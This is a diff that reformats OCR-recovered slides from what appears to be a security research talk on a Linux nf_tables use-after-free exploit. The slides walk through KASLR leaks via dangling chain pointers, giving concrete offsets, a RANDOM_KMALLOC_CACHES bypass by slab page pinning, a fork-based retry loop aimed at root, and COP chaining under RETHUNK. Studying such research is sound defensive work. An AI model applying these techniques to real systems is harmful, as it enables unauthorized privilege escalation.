+GETSETELEM follows: catchall → freed chain → freed name → controlled data leak
 
-> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**GETSETELEM path**
+1. Kernel follows verdict → chain
+2. Reads chain->name for response
+3. Returns bytes to userspace
 
-```text
-KASLR LEAK: THE DANGLING POINTER READ
-Dangling Pointer Read Chain
-GETSETELEM follows: catchall — freed chain — freed name — controlled data leak
-GETSETELEM path catchall element Leak Techniques
-verdict: GOTO
-1. Kernel follows Leak 1: Module base
-verdict — chain
-Spray 2048 nft_last
-. Reads chain->name DANGLING .. reclaim name buf
-for response with nft_last_ops ptr
-to userspace LAD ABBE, 7 Weap addr - 0x54980
-Overwrite victin4.name
-— point to struct module
-+ read module.list.prev
-vmlinux base =
-prev - offset
-Both KASLR bases defeated
-Three dangling pointers, two KASLR leaks, zero race conditions
-catchall element stays live after chain is freed — read chain fields — read name buffer
+**Attacker reads leaked kernel pointers!**
+
+`catchall element` — `verdict: GOTO` — (LIVE — still in set)
+↓ DANGLING
+`chain (FREED)` — `+0x40 table → heap`, `+0x58 name → ptr` — 120B in kmalloc-cg-128
+↓ name ptr
+`name buf (FREED)` — `"victim3_..."` 16B — kmalloc-cg-16
+
+**Leak Techniques**
+
+*Leak 1: Module base*
+Spray 2048 nft_last → reclaim name buf with nft_last_ops ptr
+`module_base = addr - 0x54980`
+
+*Leak 2: Vmlinux base*
+Overwrite victim4.name → point to struct module → read module.list.prev
+`vmlinux_base = prev - offset`
+
+**Both KASLR bases defeated**
+
+**Three dangling pointers, two KASLR leaks, zero race conditions**
+catchall element stays live after chain is freed → read chain fields → read name buffer
 All via legitimate GETSETELEM netlink requests. No timing sensitivity.
-```
 
 ## Slide 28
 
@@ -736,21 +820,23 @@ All via legitimate GETSETELEM netlink requests. No timing sensitivity.
 
 ###### **nft_last expression spray:**
 
-struct nft_expr { const struct nft_expr_ops *ops;   // +0x00 -> MODULE .rodata unsigned char data[];             // +0x08 (priv data) };
+```c
+struct nft_expr {
+    const struct nft_expr_ops *ops;   // +0x00 -> MODULE .rodata
+    unsigned char data[];             // +0x08 (priv data)
+};
+```
 
-ops->size = 16 bytes -> kmalloc-cg-16 Matches freed chain->name slot!
+`ops->size = 16 bytes -> kmalloc-cg-16`
+Matches freed chain->name slot!
 
 **Steps:**
-
 1. Free chain->name (16 bytes, kmalloc-cg-16)
-
 2. Spray 2048 nft_last expressions -> same cache
-
 3. One reclaims the freed slot
-
 4. GETSETELEM reads "chain name" -> nft_last_ops pointer
 
-module_base = nft_last_ops - 0x54980
+`module_base = nft_last_ops - 0x54980`
 
 Information Classification: General
 
@@ -760,21 +846,22 @@ Information Classification: General
 
 **struct module (__this_module in nf_tables.ko):**
 
-+0x00: state = MODULE_STATE_LIVE +0x08: list.next -> (next module) +0x10: list.prev -> &modules <-- VMLINUX BSS! +0x18: name = "nf_tables"
+```
++0x00: state = MODULE_STATE_LIVE
++0x08: list.next -> (next module)
++0x10: list.prev -> &modules        <-- VMLINUX BSS!
++0x18: name = "nf_tables"
+```
 
 nf_tables is always the most recently loaded module
-
 -> list.prev always points to the global 'modules' list head
 
 **Steps:**
-
 1. Compute: mod_list_prev = module_base + 0x3D580 + 0x10
-
 2. Spray fake chain with name ptr -> mod_list_prev
-
 3. GETSETELEM reads "chain name" -> &modules pointer
 
-vmlinux_base = &modules - 0x25dd880
+`vmlinux_base = &modules - 0x25dd880`
 
 Information Classification: General
 
@@ -784,13 +871,22 @@ Information Classification: General
 
 **CONFIG_RANDOM_KMALLOC_CACHES (Ubuntu 24.04 GA):**
 
-16 randomized sub-caches per slab size class. Each kmalloc callsite -> statically mapped to one sub-cache at boot. Attacker spray from different callsite -> different sub-cache. Heap feng shui is "dead."
+16 randomized sub-caches per slab size class.
+Each kmalloc callsite -> statically mapped to one sub-cache at boot.
+
+Attacker spray from different callsite -> different sub-cache.
+Heap feng shui is "dead."
 
 **The weakness:**
 
-The mapping is per-CALLSITE, not per-allocation. Same callsite = same sub-cache. Always.
+The mapping is per-CALLSITE, not per-allocation.
+Same callsite = same sub-cache. Always.
 
-nf_tables_addchain -> nla_strdup -> sub-cache X nf_tables_addchain -> nla_strdup -> sub-cache X   (SAME!) nf_tables_addchain -> nla_strdup -> sub-cache X   (ALWAYS!)
+```
+nf_tables_addchain -> nla_strdup -> sub-cache X
+nf_tables_addchain -> nla_strdup -> sub-cache X   (SAME!)
+nf_tables_addchain -> nla_strdup -> sub-cache X   (ALWAYS!)
+```
 
 Information Classification: General
 
@@ -800,31 +896,31 @@ Information Classification: General
 
 Information Classification: General
 
-
-> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-SLAB PAGE PINNING
-RANDOM_KMALLOC_ CACHES Bypass: Slab Page Pinning
+**RANDOM_KMALLOC_CACHES Bypass: Slab Page Pinning**
 16 sub-caches per size class. Mapping is per-callsite, not per-allocation.
-X Naive Spray (fails)
-Victim freed in sub-cache[3]:
+
+**✗ Naive Spray (fails)**
+Victim freed in sub-cache[3]: `sub-cache[3]` → [ ] [FREE] [ ] [ ]
 Spray lands in random sub-caches:
-sub-cache[7]
-NEVER RECLAIM
-Spray and victim in different sub-caches
-Same callsite = same sub-cache:
-nft chain alloc - always [N]
+- `sub-cache[7]` → [spray][spray][spray][spray] ←spray
+- `sub-cache[11]` → [spray][spray][spray][spray] ←spray
+
+**NEVER RECLAIM** — Spray and victim in different sub-caches
+
+**✓ Slab Page Pinning (works)**
+Same callsite = same sub-cache: `nft_chain alloc → always [N]`
+
 Step 1: Pin 200 chains (fill slab page)
-PIN FREE PIN PIN
-Step 2: Spray (same callsite — same [N])
-sub-cache[N]
-sub-cache[N PIN PIN PIN
-COP payload lands in victim's slot
-Key insight: RANDOM_KMALLOC_CACHES mapping is per-callsite, not per-allocation.
+`sub-cache[N]` → [PIN] [FREE] [PIN] [PIN]
+
+Step 2: Spray (same callsite → same [N])
+`sub-cache[N]` → [PIN] [COP] [PIN] [PIN]
+
+**RECLAIMED** — COP payload lands in victim's slot
+
+**Key insight: RANDOM_KMALLOC_CACHES mapping is per-callsite, not per-allocation.**
 If the victim and spray use the same kernel callsite, they always land in the same sub-cache.
-PIN _CHAIN_COUNT=200 keeps the slab page active so the freed slot is reused by the spray.
-```
+`PIN_CHAIN_COUNT=200` keeps the slab page active so the freed slot is reused by the spray.
 
 ## Slide 32
 
@@ -832,9 +928,24 @@ PIN _CHAIN_COUNT=200 keeps the slab page active so the freed slot is reused by t
 
 ###### **Parent Process retry loop:**
 
-for attempt in 1..30: child = fork() if child: unshare(CLONE_NEWNET) try_kaslr_leak() if success: write /tmp/kaslr_cache try_cop_chain() exit() waitpid(child) if /tmp/kaslr_cache exists: skip Stage 2 on next try
+```
+for attempt in 1..30:
+    child = fork()
+    if child:
+        unshare(CLONE_NEWNET)
+        try_kaslr_leak()
+        if success:
+            write /tmp/kaslr_cache
+            try_cop_chain()
+        exit()
+    waitpid(child)
+    if /tmp/kaslr_cache exists:
+        skip Stage 2 on next try
+```
 
-Attempt 1: ~1/16 chance (spray vs sub-cache) Attempt 2+: leak CACHED -> skip to Stage 4 -> Expected: root within 4-5 attempts
+Attempt 1: ~1/16 chance (spray vs sub-cache)
+Attempt 2+: leak CACHED -> skip to Stage 4
+-> Expected: root within 4-5 attempts
 
 Information Classification: General
 
@@ -842,7 +953,33 @@ Information Classification: General
 
 ##### **THE RETHUNK PROBLEM**
 
-**CONFIG_RETHUNK=y (Ubuntu 24.04): Before:                     After:** function:                   function: ...                         ... ret    <- 0xc3              jmp __x86_return_thunk => Compiler-emitted **RET** replaced with **jmp __x86_return_thunk** . => Unaligned 0xc3 bytes still exist but NOT at instruction boundaries. **Classical ROP chain:** pop rdi; ret -> (address) pop rsi; ret -> (value) ... **Status: Constrained - We use a different approach!**
+**CONFIG_RETHUNK=y (Ubuntu 24.04):**
+
+**Before:**
+```
+function:
+  ...
+  ret    <- 0xc3
+```
+
+**After:**
+```
+function:
+  ...
+  jmp __x86_return_thunk
+```
+
+=> Compiler-emitted **RET** replaced with **jmp __x86_return_thunk**.
+=> Unaligned 0xc3 bytes still exist but NOT at instruction boundaries.
+
+**Classical ROP chain:**
+```
+pop rdi; ret -> (address)
+pop rsi; ret -> (value)
+...
+```
+
+**Status: Constrained - We use a different approach!**
 
 Information Classification: General
 
